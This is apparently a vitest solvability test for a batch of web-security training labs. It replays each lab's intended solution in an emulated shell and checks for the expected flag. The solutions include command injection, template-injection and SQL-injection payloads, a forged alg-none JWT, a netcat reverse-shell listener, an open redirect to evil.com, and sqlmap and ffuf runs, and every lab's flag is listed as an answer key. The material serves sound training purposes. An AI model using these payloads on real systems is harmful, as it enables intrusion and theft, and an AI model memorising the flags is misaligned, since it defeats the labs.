import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the web labs batch B5.
// Loads the REAL fixture bundles from content/labs, replays the intended
// solution with the emulated tools, and asserts `check` passes.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-injection-basics', flag: 'nto{0s_c0mm4nd_1nj3ct10n_p1ngs_b4ck}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/tools/ping?host=shop.local'`,
      `curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bid'`,
      `curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bcat%20/flag' > found.txt`,
    ],
  },
  {
    id: 'web-client-side-template-injection', flag: 'nto{cst1_4ngul4rjs_t3mpl4t3_t0_rce}', hints: 4,
    solution: [
      `curl -s 'https://crm.example/render?q=hello'`,
      `curl -s 'https://crm.example/render?q=%7B%7B7*7%7D%7D'`,
      `curl -s 'https://crm.example/render?q=%7B%7Bconstructor.constructor(%27return%20process.env.FLAG%27)()%7D%7D' > found.txt`,
    ],
  },
  {
    id: 'web-api-rest-graphql-soap', flag: 'nto{gr4phql_1ntr0sp3ct10n_l34ks_th3_sch3m4}', hints: 4,
    solution: [
      `curl -s https://api.shop.local/`,
      `curl -s https://api.shop.local/swagger`,
      `curl -s -X POST https://api.shop.local/graphql -H 'Content-Type: application/json' --data-binary @introspection.json`,
      `curl -s -X POST https://api.shop.local/graphql -H 'Content-Type: application/json' --data-binary @secret.json > found.txt`,
    ],
  },
  {
    id: 'web-subdomain-takeover-deep', flag: 'nto{ns_d3l3g4t10n_t4k3s_th3_wh0l3_z0n3}', hints: 4,
    solution: [
      `dig +short NS internal.target.com`,
      `dig +short MX target.com`,
      `dig +short TXT _acme-challenge.internal.target.com > found.txt`,
    ],
  },
  {
    id: 'web-race-single-packet', flag: 'nto{s1ngl3_p4ck3t_4tt4ck_w1ns_th3_r4c3}', hints: 4,
    solution: [
      `curl -s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=7'`,
      `cat turbo.py`,
      `python3 turbo.py > found.txt`,
    ],
  },
  {
    id: 'web-websocket', flag: 'nto{w3bs0ck3t_trusts_x_f0rw4rd3d_us3r}', hints: 4,
    solution: [
      `websocat ws://t/ws`,
      `websocat -H 'X-Forwarded-User: admin' ws://t/ws > found.txt`,
    ],
  },
  {
    id: 'web-tool-httpie', flag: 'nto{httpi3_m4k3s_4p1_r3c0n_3ff0rtl3ss}', hints: 4,
    solution: [
      `http GET https://api.example/v1/item?id=1`,
      `http GET https://api.example/v1/flag 'X-API-Key:shp_live_9f3c2a' > found.txt`,
    ],
  },
  {
    id: 'web-xss-bypass-advanced', flag: 'nto{csp_byp4ss_v14_4ll0wl1st3d_jsonp}', hints: 4,
    solution: [
      `curl -sI https://shop.local/`,
      `curl -s 'https://cdn.shop.local/api/user?callback=alert'`,
      `curl -s 'https://cdn.shop.local/api/secret?callback=cb' > found.txt`,
    ],
  },
  {
    id: 'web-xss-client-side', flag: 'nto{0p3n_r3d1r3ct_ch41ns_t0_1nt3rn4l_4dm1n}', hints: 4,
    solution: [
      `curl -sI 'https://shop.local/login?next=/profile'`,
      `curl -sI 'https://shop.local/login?next=https://evil.com'`,
      `curl -sL 'https://shop.local/login?next=//internal.shop.local/admin' > found.txt`,
    ],
  },
  {
    id: 'web-tool-jwt-tools', flag: 'nto{jwt_4lg_n0n3_f0rg3d_4dm1n}', hints: 4,
    solution: [
      `cat token.txt`,
      `python3 jwt_tool.py token.txt`,
      `python3 jwt_tool.py token.txt -I -pc role -pv admin -S none`,
      `curl -s https://shop.acme-lab.test/admin -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.' > found.txt`,
    ],
  },
  {
    id: 'web-tool-netcat-socat', flag: 'nto{r3v3rs3_sh3ll_c4ught_th3_fl4g}', hints: 4,
    solution: [
      `cat shell.sh`,
      `nc -lvnp 4444 > found.txt`,
    ],
  },
  {
    id: 'web-tool-httpx-katana', flag: 'nto{httpx_k4t4n4_m4pp3d_th3_h1dd3n_3ndp01nt}', hints: 4,
    solution: [
      `httpx -l subs.txt -title -tech-detect -status-code -silent`,
      `katana -u https://shop.example -jc`,
      `curl -s https://shop.example/internal/flag > found.txt`,
    ],
  },
  {
    id: 'web-tool-sqli-manual', flag: 'nto{m4nu4l_un10n_byp4ss3s_sqlm4p}', hints: 4,
    solution: [
      `curl -s 'https://shop.example/api/item?id=1'`,
      `curl -s 'https://shop.example/api/item?id=1%27'`,
      `curl -s 'https://shop.example/api/item?id=1 ORDER BY 3'`,
      `curl -s 'https://shop.example/api/item?id=-1 UNION SELECT 1,password,3 FROM users-- -' > found.txt`,
    ],
  },
  {
    id: 'web-tools-sqli', flag: 'nto{sqlm4p_r3qu3st_f1l3_dump5_th3_db}', hints: 4,
    solution: [
      `curl -s 'http://shop.t/product?id=10%27'`,
      `cat request.txt`,
      `sqlmap -r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql --dump > found.txt`,
    ],
  },
  {
    id: 'web-tools-fuzz', flag: 'nto{ffuf_f1lt3r_by_s1z3_f1nd5_th3_h1dd3n_p4th}', hints: 4,
    solution: [
      `ffuf -u https://shop.acme-lab.test/FUZZ -w raft.txt -t 40`,
      `ffuf -u https://shop.acme-lab.test/FUZZ -w raft.txt -fs 5211`,
      `curl -s https://shop.acme-lab.test/admin > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B5: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
